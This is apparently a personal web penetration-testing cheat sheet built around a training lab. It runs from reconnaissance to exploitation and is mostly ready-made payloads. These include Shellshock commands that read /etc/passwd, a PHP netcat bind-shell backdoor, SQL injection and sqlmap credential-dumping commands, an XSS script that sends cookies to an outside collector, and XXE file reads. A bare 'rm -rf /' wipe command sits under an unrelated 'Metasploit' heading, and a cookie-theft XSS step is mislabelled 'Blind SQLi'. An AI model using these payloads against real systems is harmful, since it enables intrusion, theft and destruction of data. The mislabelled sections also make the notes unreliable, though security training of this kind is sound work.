# Web Application Penetration Testing

## Kali Setup

Install the kali-linux-web metapackage:
```
apt-get update && apt-get install kali-linux-web
```

<br/>

## Open Source Intelligence Gathering

### Search Engines

Use advanced search engine functions to gather information about the target web server:

* [DuckDuck GO Search Search Syntax](https://help.duckduckgo.com/duckduckgo-help-pages/results/syntax/) 
* [Google Refined Web Searches](https://support.google.com/websearch/answer/2466433?hl=en)
* [Bing Advanded Operator Reference](https://docs.microsoft.com/en-us/previous-versions/bing/search/ff795620(v=msdn.10))
* [Bing advanced Keyword Searches](https://support.microsoft.com/en-us/topic/advanced-search-keywords-ea595928-5d63-4a0b-9c6b-0b769865e78a)

### Google Dorking 

Crafted queries that return specific meaningful data.  [Google hacking database](https://www.exploit-db.com/google-hacking-database) provides a collection of dorks 

Example - looking for government websites containing admin in the URL and an excel document:
```
inurl:admin filetype:xlsx site:gov.*
```

### Cached Content

Search the [wayback machine](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwiMlLvX6aP2AhXKoXIEHb2IDs4QFnoECAUQAQ&url=https%3A%2F%2Farchive.org%2Fweb%2F&usg=AOvVaw1olZ8IYxs_xjPuf-Ft5fso) or google cache for previous (vulnerable version) of a website:
```
cache: sans.org
```

### [Shodan](https://www.shodan.io/)

* [Shodan Intelligence Extraction (SHINE)](https://www.tofinosecurity.com/blog/project-shine-1000000-internet-connected-scada-and-ics-systems-and-counting)

### [Fingerprinting Organizations with Collected Archives (FOCA)](https://www.elevenpaths.com/innovation-labs/technologies/foca)

Document metadata search tool

### OSINT Suites

* Maltego
* Spiderfoot 

### OSINT Command Line Tools

theHarvester:  
```
theharvester -d <DOMAIN> -b all -f <OUPUT_FILE.html>
```
Another alternitive is AutOSINT which leverages theHarvester and pyfoca

<br/>

## Virtual host Discovery

### Domain Name Service (DNS)

Perform full DNS zone transfer"
```
dig -<DOMAIN> -t axfr
dnsrecon.py -a -d sec542.org
nmap --script=dns-zone-transfer sec542.org
```
Perform reverse dns scan:
```
dnsrecon.py -r 192.168.1.0/24
```
Reslove domain to IP address
```
nslookup <DOMAIN>
```
Reslove domain to IP address and return all records:
```
# using the default DNS server
dig <DOMAIN> -t any

# using google's DNS server
dig @8.8.8.8 <DOMAIN> -t any

# mail exhange (MX) record
dig @<IP_ADDR> <DOMIAN> -t mx

# PTR (reverse) record
dig <IP_ADDR>.<DOMAIN> PTR
dnsrecon.py -r 10.42.42.0/24
nmap -sL 10.42.42.0/24
nmap -sL 10.42.42.0/24 | grep \)

# Simplified PTR (reverse) lookup
dig -x <IP_ADDR>

# Query nameservers version of bind:
dig @<IP_ADDR> version.bind chaos text
```
View the nmap DNS scripts:
```
ls -la /usr/local/share/nmap/scripts/dns*
```
Brute force:
```
nmap --script=dns-brute sec542.net
# default list :  /usr/local/share/nmap/nselib/data/vhosts-default.lst

# custom wordlist 
nmap --script=dns-brute sec542.net --script-args=dns-brute.hostlist=/opt/dnsrecon/namelist.txt

dnsrecon.py -t brt -d sec542.net -n 127.0.0.1 -D /opt/dnsrecon/namelist.txt
```
Metasploit DNS information gathering:
```
# brute force dictionary DNS scan
use auxillary/gather/dns_bruteforce

use auxiliary/gather/enum_dns 
set DOMAIN sec542.net
set ENUM_RVL true
set IPRANGE 10.42.42.0/24
set NS 10.42.42.42
run

# Query DNS cahce for previously resolved names
use auxillary/gather/dns_cache_scraper

# Gather general DNS information
use auxillary/gather/dns_info

# Perform reverse DNS (PTR) scan of a netblock
use auxillary/gather/dns_reverse_lookup

# enumerate SRV (Server) records
use auxillary/gather/dns_srv_enum
```
For online DNS qureies, use https://dnsdumpster.com

<br/>

## Verb testing

See what HTTP methods are enabled by the webserver:

Use Netcat to craft an HTTP version 1.0 HEAD request to http://www.sec542.org:
```
# "-C" flag tells netcat to send CRLF
nc -C sec542.org 80

# enter this and press enter twice
HEAD / HTTP/1.0

# for HTTP 1.1, must include the host header field

# must include host header field for 1.1
Host: sec542.org
```
Use curl to test HTTP methods, use `-i` for response headers and `-X` for OPTION:
```
curl -i -X OPTIONS <DOMAIN/IP>

# check if the trace method is allowed, if not you will get a 405 Method not allowed
curl -i -X TRACE <DOMAIN/IP>
```
Use a bash script to enumerate the http methods allowed.  This loops through each of the common HTTP methods, attempts to connect to the webserver with the associated method and prints results that only incluide the servers HTTP response code:
```
for methods in GET HEAD POST PUT DELETE TRACE OPTIONS
    do
        echo "$methods:"
        echo -ne "methods: / HTTP/1.0\n\n" | nc <IP_ADDR> <PORT> | grep "HTTP/"
done
```
Check if the TRACE method is enabled and use a cookie:
```
curl -i -H "Cookie: <COOKIE>" -X TRACE <DOMAIN/IP>
```
Cross Site Tracing - if trace is enabled you can attempt to use it to disclose credentials/cookies:
* https://www.cgisecurity.com/whitehat-mirror/WH-WhitePaper_XST_ebook.pdf

References
* https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods.md

<br/>

## Information Gathering

### Port Scanning 

*Before conducting active scans, check the scans from Shodan and Netcraft Site report (lifetime of the website)

Netcat script for non-ephemeral ports:
```
for port in {0..1023}
    do
        nc -nzv <IP_ADDR> $port 2>&1 | grep -i succeeded
done
```
Perform an Nmap version scan of www.sec542.org
```
nmap -sV -p 80 sec542.org 
```
Use an Nmap NSE script to investigate the contents of the robots.txt file 
```
nmap --script=http-robots.txt www.sec542.org
```
### HTTPS enumeration

#### SSL/TLS Analysis

Check what cipher suites the server supports (looking for TlS 1.2/SSL 3.0 and older):
```
nmap -p 443 --script=ssl-enum-ciphers <DOMAIN>
# graded A > F or best to worst
```
*Use Qualys SSL lab to submit the website for SSL configuration evaluation: https://www.ssllabs.com/ssltest/

### Heartbleed

Heartbleed detection:
```
nmap -p 443 -sV --script ssl-heartbleed heartbleed.sec542.org
```
Exploitation:
```
/usr/local/bin/heartbleed.py -f </home/student/OUTPUT_FILE>.bin heartbleed.sec542.org -p 443

# view the plaint text in the output file
strings <OUTPUT_FILE>.bin
```
PoC: https://github.com/sensepost/heartbleed-poc

### Vulnerable Plugins

Use the Retire.js plugin to look for outdated components in the https://www.sec542.org/phpbb/ application.

  1. Open burpsuite (ensure that burp is set as the proxy in your browser)
  2. Click the "Extender" menu item, and then click on the "BApp Store" sub-menu item.
  3. Scroll down to the "Retire.js" item in the "BApp Store" list, select "Retire.js" by clicking on it, and then click the "Install" button in the main pane of page to the right.  Once the installation is complete, a checkmark will appear in the "Installed" column next to "Retire.js" within the "BApp Store" list.
  4. Switch back to the "Dashboard" tab within Burp Pro.
  5. Navigate to https://www.sec542.org/phpbb in a web browser
  6. Return back to Burp Pro, and look in the "Issue Activity" pane of the Dashboard windows for a reference to "Vulnerable version of the library 'jquery' found"
  7. Select the "Vulnerable version of the library 'jquery' found" entry, and then review the information in the "Advisory" pane of the Dashboard window.

<br/>

## Spidering

Command line spidering:
```
# point ot the interception proxy (Burp/Zap)
export https_proxy=https://127.0.0.1:8080

# run the spider recursivley (-r)
wget -r -P /tmp --no-check-certificate <DOMAIN>

# crawl entries in robots.txt
wget -r -P /tmp -e robots=off --no-check-certificate <DOMAIN>
```
#### ZAP SPider

*Configure Firefox to use ZAP as its proxy

  1. In Firefox: surf to https://sec542.org.
  2. In ZAP: go to the **History** tab and right-click on the GET request to https://sec542.org. Then choose **Attack -> Spider**
  3. On the next menu, choose **Start Scan**
  4. A new Spider tab will be added to the bottom and will show the progress and some results of the spidering process. Newly-identified paths and resources will be visible in the **Sites** tab

#### Burp Spidering

*Configure Firefox to use Burp as its proxy

  1. In Burp, click the "New scan" button on the dashboard.
  2. Then choose **Crawl** and enter "https://sec542.org" in the **URLs to Scan** box. Then check on **Detailed scope configuration**
  3. Then select **Use advanced scope control** and click **Add**. A window labelled "Add URL to include in scope" will pop up. Choose **Any** for the protocol and enter the following regular expression in the **Host or IP range** field: `.*?sec542.org$`
  4. Then click **OK** in the "Add URL to include in scope" box.
  5. Then click **Scan configuration** and choose **New"**. Select **Crawl limits** and limit the crawl time to 5 minutes. Also set "Maximum unique locations discovered" to 500. This will discover a lot of content in a reasonable amount of (lab) time. Then click **Save**
  6. Then click **OK** in the **New scan** window. The scan will begin.
  7. Go to Burp's Dashboard and view the Tasks. You may need to scroll down to see the progress of the live scan.
  8. Go to Burp's **Target -> Site Map** and note the site map is populating.

#### CEWL 

Spidering for building a list of words discovered on a website:
```
cewl <DOMAIN>

# output to a file
cewl -w <OUTPUT_FILE> https://sec542.org

# set minimum word length to 20 characters
cewl -w <OUTPUT_FILE> -m 20 https://sec542.org
```

<br/>

## Forced Browsing (Directory Bruteforcing)

Use seclists for wordlists: https://github.com/danielmiessler/seclists
- this incorporates FuzzDB
 
### ZAP Forced Browsing

Surf to http://cust42.sec542.net.  Use ZAP's Forced Browse to discover unlinked URLs at http://cust42.sec542.net

  1. In ZAP, right-click on http://cust42.sec542.net from the **History** tab, choose **Attack**, and then choose **Force Browse site**
  2. Click on the **Forced Browse** tab, right click on an intertesting URL, and Choose **Open URL in System Browser** to investigate further

### Burpsuite - Discover Content in Engagement Tools (BurpSuite Pro) - TO-DO

### Command Line Tools

ffuf (Fuzz Faster U Fool) is a very fast web fuzzer. It allows us to fuzz any injection point in an HTTP request by simply supplying a wordlist to the tool, and using the FUZZ keyword where we want the fuzzing to happen.
```
# fuzz directories
ffuf -w <WORDLIST> -u <DOMAIN>/FUZZ
    
# specify extension
ffuf -w <WORDLIST> -u <DOMAIN>/FUZZ -e .aspx,.html,.php,.txt

# vitual host discovery by fuzzing the Host header
ffuf -w <WORDLIST> -u <DOMAIN> -H "HOST: <INJECTION_POINT>.<DOMAIN>"
ffuf -w /usr/share/dirb/common.txt -u http://www.sec542.org -H "Host: FUZZ.sec542.org"
ffuf -w /opt/fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-directories.txt -u http://cust42.sec542.net/FUZZ
```

<br/>

## Directory Browsing 

Similar to forced browsing, it exposes the underlying file system (/images, etc.)

Googe Dork for government websites that expose the file system: 
```
site:gov intitle:"Index of" "last modified"
```
Command Line Tools
* Dirb
* DirBuster
* FuzzDB
* JBroFuzz
* WMAP

<br/>

## Authentication

You can use Burp to handle built-in authentication instead of the browser.  Go to User **Options > Connections > Platform Authentication > Add > Authentication Type** (supports Basic, NTLMv1, and NTLMv2 HTTP). 

### ZAP – Basic Authentication

  1. Start up Zap Proxy in Firefox. Open a new tab in Firefox (press <CTRL>-T) and surf to: https://sec542.org/basic
  2. Double-click on the request in the **History** tab. Click on the **Response** tab to view the server's response to the initial HTTP GET request.
  3. Switch back to Firefox and supply an incorrect username and password in the pop-up box: `baduser:badpass`.  Notice the server response in Zap
  4. Now provide the correct credentials of 'marvin:paranoid' 
  5. Switch back to ZAP, and find the https://sec542.org/basic/ requests under the **History** tab.  Select the request to https://sec542.org/basic/ with a 200 status code. Then select the **Request** tab
  6. Find the HTTP Authorization header and highlight the encoded string found after 'Authorization: Basic'.  Right-click on the highlighted string and select **Encode/Decode/Hash...**
  7. Select the **Decode** tab and the credentials submitted should be revealed under the Base 64 Decode box.  You can also manually decode the Base64
  ```
  echo bWFydmluOnBhcmFub2lk | base64 -d
  ```

### ZAP – Digest Authentication
   
  1. Switch back to Firefox and surf to: https://sec542.org/digest
  2. Fail to log in by submitting invalid credentials in the pop-up box: 'baduser:badpassword'
  3. Now supply the valid credentials `trillian:planet`
  4. Go to ZAP's **History** tab, and locate the matching GET to https://sec542.org/digest/ with a 200 code. Then click the Request tab to view the digest authentication values.

### Cracking HTTP Disgest Authentication 
    
Using digestive copy/paste your respective nonce, response, and cnonce values from ZAP, overwriting NONCE, RESPONSE, and CNONCE
```
# example HTTP requets using Disgest Authentication

Authorization: Digest username="trillian", realm="Security542", nonce="ONfcYWLABQA=5fe6d8d5913cd5d04b0eb7eefed97b5908851f68", uri="/digest/", algorithm=MD5, response="d566f64fde86dbf5f06c705232d0862c", qop=auth, nc=00000001, cnonce="843ceaa9709ca5b7"

# use the values to crack the passworkd with digestive (these values will differ with each authentication):
digestive --wordlist /opt/john/run/password.lst --username trillian --realm Security542 --uri /digest/ --qop auth --nc 00000001 --method GET --nonce NONCE --response RESPONSE --cnonce CNONCE

digestive --wordlist /opt/john/run/password.lst --username trillian --realm Security542 --uri /digest/ --qop auth --nc 00000001 --method GET --nonce Mfx9gTDWBQA=2e72b9b9b914a5d026f0a10e1aea739d22c85322 --response b60a1284e24080169b04c0c3c2aa42b5 --cnonce 70d25d599e3e1c6d
```
    
### ZAP – Forms-Based Authentication
  
  1. In Firefox go to https://sec542.org/form/ 
  2. Submit invalid credentials in the HTML Form. Review the request and response
  3. Click **try again** and supply the valid credentials: `ford:galaxy`
  4. Click the **Filter** button in the **History** tab. In the Filter History box that pops up select **Form** under **Tags** and click **Apply**
  5. Look at the details of the two POST requests to /form/login.php (clear-text credentials)

### Burp – Forms-Based Authentication

  1. Start up Burp and set it as the proxy in Firefox
  2. In Firefox, go to https://sec542.org/form/.  Attempt (and fail) to log in to the form with `adent//asdf`
  3. Switch to the **Burp -> Proxy -> HTTP History** tab and then right-click this POST, Then choose Send to Intruder.
  4. Click the **Intruder tab > Positions tab**
  5. Click **Clear §** to clear the automatically determined fuzzing positions.
  6. Highlight the password you typed previously, then click Click **Add §** to fuzz that field.
  7. Now, click the **Payloads** tab.  Choose **Simple List** from the Payload Sets menu. Then click Load under Payload Options [Simple list]
  8. Select the file `/opt/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt` and click Open
  9. Click Start attack.
  10. Since all the responses have an HTTP 200 status code, in the results tab, sort by length, largest to smallest, to see the successful request
  11. Check the **Response** tab for the `Successful Form Athentication!` message for the password `dragon`

<br/>
    
## Credential Harvesting

Use the user_enum script in the vM to find additional usernames to try.
```
user_enum /home/student/lastnames
```
    
### ZAP Fuzzing 

  1. In Firefox, go to http://sec542.org/userenum/securelogin.php and retry a good username, bad password adent//asdf
  2. In ZAP: Ensure the Filter is "OFF".  If it is "ON": click the ***Filter** icon, choose **Clear** and **Apply.** Go to the **History** tab and right-click the POST to http://sec542.org/userenum/securelogin.php.  Choose **Attack** and then click **Fuzz**...
  3. In the ZAP Fuzzer menu: Highlight the "a" in "adent", then click add
  4. Click **Add…** again on the next Payloads screen:
  5. In the ZAP Add Payload menu, click the Type dropdown and select **File Fuzzers**
  6. Then, select jbrofuzz (triangle not checkbox) -> Alphabets (triangle)-> English Alphabet (checkbox).  Then click add
  7. Click **OK** on the Payloads screen:
  8. In the ZAP Fuzzer menu, highlight the "dent" in "adent".  Click add
  9. Click **Add...** again on the next Payloads screen:
  10. In the ZAP Add Payload menu, select Type: File.  Then select /home/student/combined, and click **Add**.Then, click **OK** on the Payloads screen:
  11. Click Start Fuzzer, and ZAP starts fuzzing.
  
### Find the Valid Users
   
  1. In the **Fuzzer** tab, Try sorting by the RTT (Round Trip Time) column, largest to smallest
  2. You should see that the RTT (round trip time) for valid users is more than ten times greater than the RTT for invalid users.  Our results show:
  ```
  Valid users RTT: > 200 ms.
  Invalid: < 50 ms.
  ```

### Burp Fuzzing               

  1. Start up Burp and set it as the proxy in Firefox
  2. In Firefox, go to https://sec542.org/form/.  Attempt (and fail) to log in to the form with `adent//asdf`
  3. Switch to the **Burp -> Proxy -> HTTP History** tab and then right-click this POST, Then choose Send to Intruder.
  4. Click the **Intruder tab > Positions tab**
  5. Click **Clear §** to clear the automatically determined fuzzing positions.
  6. Highlight the password you typed previously, then click Click **Add §** to fuzz that field.
  7. Now, click the **Payloads** tab.  Choose **Simple List** from the Payload Sets menu. Then click Load under Payload Options [Simple list]
  8. Select the file `/opt/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt` and click Open
  9. Click Start attack.
  10. Since all the responses have an HTTP 200 status code, in the results tab, sort by length, largest to smallest, to see the successful request
  11. Check the **Response** tab for the `Successful Form Athentication!` message for the password `dragon`  

<br/>
    
## Session Tokens

Analyzing using Burp Sequencer - Exercise 2.6

Parameter Tampering with Burpsuite - Exercise 2.7

<br/>
    
## Shellshock 
  ```
  # basic syntax
  curl -A "<USER-AGENT>"
  
  # print the contents of /etc/passwd file
  curl -A "() { 42;};echo;/bin/cat /etc/passwd" http://sec542.org/cgi-bin/netstat.cgi
  
  # current user id
  curl -A "() { 42;};echo;/usr/bin/id" http://sec542.org/cgi-bin/netstat.cgi
  
  # kernel version
  curl -A "() { 42;};echo;/bin/uname -a" http://sec542.org/cgi-bin/netstat.cgi
  ```

*Exercise 2.8 


## Local File Inclusion
    
Accessing files outside of the webroot, typically through URI parameters
```
# relative path
../../../etc/passwd

# URL encoded slashes (may need to encode the periods as well to bypass filters)
..%2F..%2F..%2Fetc%2Fpasswd

# absolute path
/var/log/apache/access.log

# complete payload with URI parameter
/dvwa/vulnerabilites/fi/?page=../../../etc/passwd
```
    
## Remote File Inclusion (RFI)

After discovering a vulnerable parameter, create a script to execute a command on the target machine:
```
<?php
    echo shell_exec('id');
?>
  
# one-line version
<?php echo shell_exec('id'); ?>
``` 
    
RFI Netcat backdoor using php:
```
<?php
echo shell_exec('ncat -l -p 4444 -e /bin/bash');
?>

# navigate to the backdoor in a web browser to execute the backdoor, then connect to it using netcat    
```
<br/>
    
## Insecure Deserialization

## SQL Injection
    
### SQL Basics
    
SQL Verbs
* SELECT - retrieve data from a table
* INSERT - add data from a table
* UPDATE - modify existing table
* DELETE - delete data in a table
* DROP - delete a table
* UNION - Combine data from multiple queries
    
SQL Query modifiers
* WHERE - filter query to apply only when condition is satisfied
* AND/OR - combined with WHERE to narrow a query 
* LIMIT - limit number of rows returned
* ORDER BY - sort by column

### Discovering SQL Injection
    
Payloads
```
OR 1=1
AND 1=1
OR 'a'='a'

# comment out errors (some DBS require a space after --)
<INPUT>` OR 1=1; --
<INPUT>` OR 1=1; --,
<INPUT>` OR 1=1; #
<INPUT>; AND 1;#
<INPUT>; AND 1=1;#
    
# use valid input and quote balacing with comment
<INPUT>';-- ';

# use valid input and quote balacing wihtout comments
'<INPUT>' OR 'a'='a';
    
# string deliminated with username Dent.  If any of these work, there is an SQLi flaw
Dent';#
Dent';--    
De'/**/'nt
De' 'nt
```
    
### Reflected SQLi (Error-Based)

#### Determining the number of columns

Use UNION with NULL and iterate until data is retrieved and there is no error:
```
SELECT * FROM Users WHERE lname='Dent' UNION SELECT NULL;-- ';
SELECT * FROM Users WHERE lname='Dent' UNION SELECT NULL,NULL;-- ';
SELECT * FROM Users WHERE lname='Dent' UNION SELECT NULL,NULL,NULL;-- ';
SELECT * FROM Users WHERE lname='Dent' UNION SELECT NULL,NULL,NULL,NULL;-- ';
    
# Oracle
' UNION SELECT NULL FROM DUAL--
' UNION SELECT NULL,NULL FROM DUAL--
```
Use ORDER BY by iterating the number of columns until you receive an error:
```
Green' ORDER BY 3;#  
Green' ORDER BY 4;#  
Green' ORDER BY 5;#
# error
```
Find coloumns with interesting data (string) by using UNION SELECT to probe each coloumn to determine if it can hold string data.  If the coloumn cannot hold string data, the database will return an error:
```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
    
# using a number
SELECT * FROM Users WHERE lname='Dent' UNION SELECT '42',NULL,NULL,NULL;-- ';
SELECT * FROM Users WHERE lname='Dent' UNION SELECT NULL,'42',NULL,NULL;-- ';
```
If you know the table and columns, attempt to retrieve data:
```
' UNION SELECT username, password FROM users--
    
# concatonate the values together with a deliminator
' UNION SELECT username || '//' || password FROM users--
    
# if there are three columns in the table:
' UNION SELECT NULL,username || '//' || password FROM users--

```
```
# Oracle Database (use the Dummy table DUAL)
<VALID INPUT>' UNION SELECT NULL FROM DUAL ;--
```
```
# MySQL read the contents of a file
UNION SELECT LOAD_FILE('/etc/shadow'),1 #
```

### Database Fingerprinting (post knowing column numbers)

Obtaining the version of the database in a column that can handle a string:    
```
# MySQL and SQL Server
SELECT 1,@@version,3--
    
# Oracle
SELECT * FROM v$version
+UNION+SELECT+BANNER,+NULL+FROM+v$version--

# PostgreSQL
SELECT version()
```
 
#### Examining Contents of a Database

*Assumes that there are two columns

Listing the tables of a database:
```
# PostgreSQL/MySQL
` UNION SELECT table_name,NULL FROM information_schema.tables--  
    
# Oracle
' UNION SELECT table_name,NULL FROM all_tables--
```
Knowing the name of the tables, list the contents of a selcted table (columns):
```
# PostgreSQL/MySQL
'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='pg_authid'-- 

# Oracle
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_ZQDDCI'--
```
Knowing columns and table, we can now retieve data from the database:
```
' UNION SELECT username_luptuv, password_dwjsjq FROM <TABLE>--
    
# Oracle
' UNION SELECT USERNAME_FNMZSO,PASSWORD_LKDRWA FROM USERS_ZQDDCI--
```
    
### BLind SQLi

Blind SQL injection arises when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors. 
    
-- left off here: https://portswigger.net/web-security/sql-injection/blind

#### Triggering Conditional Responses

Union select from two different tables
```
101' UNION SELECT * FROM <TABLE> where id = '101'; #
```
    
### Stacking Queries

Splitting queries using a semi colon which are useful in breaking out of confines of an existing query:
```
# create a table called exfil that is contains the output of the first query:
SELECT * FROM Users WHERE lname='Dent'; CREATE TABLE exfil(data varchar(1000));-- ';
```

### UNION
    
Use unions to combine the contents of 2 tables, require us to know the data type and column numbers in a table:
```
SELECT <TABLE_1_COLUMN> FROM <TABLE_1> WHERE <TABLE_1_COLUMN>='<VALID_ENRTY>' UNION SELECT <TABLE_2_COLUMN> FROM <TABLE_2>;
```
Use UNION with NULL
    
#### Automated SQLi with sqlmap   
```
sqlmap -u "https://dvwa.sec542.org/vulnerabilities/sqli/?id=1&Submit=Submit" --batch 

# crawl the site and target forms for injection
sqlmap -u "https://dvwa.sec542.org/vulnerabilities/sqli/?id=1&Submit=Submit" --crawl --forms --batch 

# use a session token from an authenticated session and a proxy
sqlmap -u "https://dvwa.sec542.org/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=orcl500326lro85rvkr6alu105; security=low" --proxy http://localhost:8081 --batch
    
# change user-agent from the default sqlmap/<VERSION>
sqlmap -u "https://dvwa.sec542.org/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=orcl500326lro85rvkr6alu105; security=low" --proxy http://localhost:8081 --batch --user-agent 42

# include the database (if known)
sqlmap -u "https://dvwa.sec542.org/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=orcl500326lro85rvkr6alu105; security=low" --proxy http://localhost:8081 --batch --user-agent 42 --dbms mysql

# dump entire DBMS schema (databases, tables, and column names)
sqlmap -u "https://dvwa.sec542.org/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=orcl500326lro85rvkr6alu105; security=low" --proxy http://localhost:8081 --batch --user-agent 42 --schema
    
# list databases
sqlmap -u "https://dvwa.sec542.org/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=orcl500326lro85rvkr6alu105; security=low" --proxy http://localhost:8081 --batch --user-agent 42 --dbs

# search the database for a string
sqlmap -u "https://dvwa.sec542.org/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=orcl500326lro85rvkr6alu105; security=low" --proxy http://localhost:8081 --batch --user-agent 42 -D <DATABASE> --search <STRING>

# list tables from a selected database
sqlmap -u "https://dvwa.sec542.org/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=orcl500326lro85rvkr6alu105; security=low" --proxy http://localhost:8081 --batch --user-agent 42 -D <DATABASE> --tables
    
# dump the contents of a table
sqlmap -u "https://dvwa.sec542.org/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=orcl500326lro85rvkr6alu105; security=low" --proxy http://localhost:8081 --batch --user-agent 42 -D <DATABASE> -T <TABLE> --dump
    
# read a file
sqlmap -u "https://dvwa.sec542.org/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=orcl500326lro85rvkr6alu105; security=low" --proxy http://localhost:8081 --batch --user-agent 42 --file-read /etc/passwd
    
# dump usernames and passwords
sqlmap -u "https://dvwa.sec542.org/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=orcl500326lro85rvkr6alu105; security=low" --proxy http://localhost:8081 --user-agent 42 --users --passwords
    
# spawn a limited shell
sqlmap -u "https://dvwa.sec542.org/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=orcl500326lro85rvkr6alu105; security=low" --proxy http://localhost:8081 --user-agent 42 --os-shell
```

SQLi References
* https://websec.ca/kb/sql_injection
* https://pentestmonkey.net/category/cheat-sheet/sql-injection
* https://sqlwiki.netspi.com/
* https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
* https://portswigger.net/web-security/sql-injection/cheat-sheet


## Cross Site Scripting (XSS)

Description: Reflected cross-site scripting (or XSS) arises when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way

### XSS Payloads

Generate a static pop-up:
```
<script>alert('XSS')</script>
<script>confirm('XSS')</script>
<script>prompt("Vulnerabilty:",'XSS')</script>
```
Display the domain:
```
<script>alert(document.domain)</script>
<script>confirm(document.domain)</script>
```
Display session information (cookies)
```
<script>alert(document.cookie)</script>
```
External loading capability:
```
src="//sec542.org/evil.js" 
```
#### URL (percent) encoding

In order to bypass filters, payloads should be URL encoded using
* Burp -> Decoder -> Encodes ... -> URL (encode entire string)
* Burp -> Intruder -> Payloads -> Payload Encoding (automatically encodes the provided payload)
* ZAP -> Tools -> Encode/Decode/Hash (encodes special characters)
* Firefox -> Web Developer Tools -> CTRL+SHIFT+K

Encoded static pop-up:
```
%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
```
Lists of XSS Payloads
* Fuzzdb -https://github.com/infosec-au/fuzzdb/blob/master/attack-payloads/xss/xss-rsnake.txt
* JBroFuzz - https://github.com/foospidy/payloads/blob/master/owasp/jbrofuzz/xss.txt
* Burp
* Zap

### Blind SQLi

Use Burp Collaborator to steal cookies
 
  1. Go to **Burp -> Burp Collaborator Client** 
  2. Then press **Copy to clipboard** 
  3. Type the following in the **Is it Alive?** page: 'sec542.org; nslookup <CTRL>-V' (to paste your unique DNS name)
    ```
<script>
fetch('https://z99a0wo1bfcmlghlymwm5vrqwh2aqz.burpcollaborator.net', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
    ```
  4. Press **Submit** and return to the Burp Collaborator client window and press **Poll now**
  5. Check the **Request to Collaborator** tab for the users's session token (cookie)
    

### Automated XSS Tools

#### XSSer

Automates the process of detecting and exploiting XSS injections
```
xxser -u <URL> --user-agent <USER_AGENT> --crawl <DEPTH>

# Proxy
xxser -u <URL> --proxy <IP:PORT> --user-agent <USER_AGENT> --crawl <DEPTH>

# GTK interface
xsser --gtk
```
#### [xsssniper](https://www.kali.org/tools/xsser/)

XSS vulerability discovery tool
```
xsssniper -u "<DOMAIN>" --crawl --forms

# run through a proxy
xsssniper -u "<DOMAIN>" --crawl --forms --http-proxy 127.0.0.1:8080
```
#### [XSScrapy](https://github.com/DanMcInerney/xsscrapy)

XSS/SQLi spider
```
./xsscrapy.py -u http://example.com

# login with HTTP Basic Auth then crawl:
./xsscrapy.py -u http://example.com/login_page -l loginname --basic

# Use cookies
./xsscrapy.py -u http://example.com/login_page --cookie "SessionID=abcdef1234567890"
```
#### [get2post.py](https://github.com/MarkBaggett/MarkBaggett/blob/master/get2post.py)

Uses a demolink that is passed to the target and POST payloads as URL parameters (GET -> POST)

### DOM-Based XSS

#### Burpsuite Burpsuite DOM Invader

<br/>
    
## BeEF

## Metasploit

Remove all files in the root directory
```
rm -rf / --no-preserve-root 
```
    
<br/>
    
## Python Request Libraries

Use 'import requests' to use the request libraries
    
HTTP GET request:
```
r = requests.get('http://www.sec.542.org) 
```
Print the server field in the HTTP response:
```
# python 2
print r.headers['server']
    
# python 3
print (r.headers['server'])
```
Full script in python3:
```
#!/usr.bin/python3

import requests

r = requests.get('http://www.sec.542.org) 
print (r.headers['server'])
```

<br/>
 
## SSRF
    
<br/>
    
## XXE 
    
XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access.

Example vulnerable XML:
```
<?xml version="1.0"?>
<entry>
    <subject>Earth</subject>
    <category>Planets</category>
    <text>Mostly harmless.</text>
</entry>
```
To exploit XXE we need to do two things:
    
* Introduce (or edit) a DOCTYPE element that defines an external entity containing the path to the file (placed after the XML declaration and before the first element).
* Edit a data value in the XML that is returned in the application's response, to make use of the defined external entity.

Use XXE to retrieve a file:
``` 
# enter the following xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<entry>
    # reference to the external entity
    <subject>&xxe;</subject>
    <category>Planets</category>
    <text>Mostly harmless.</text>
</entry>

# single line version:
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
    
# send as a file the xml file to xml.php 
curl -d@/home/student/guide3.xml http://www.sec542.org/guide/xml.php
```
    
Use XML to navigate to an internal web server:
```
# enter the following xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/" >]>
<entry>
    <subject>&xxe;</subject>
    <category>Planets</category>
    <text>Mostly harmless.</text>
</entry>

# one line
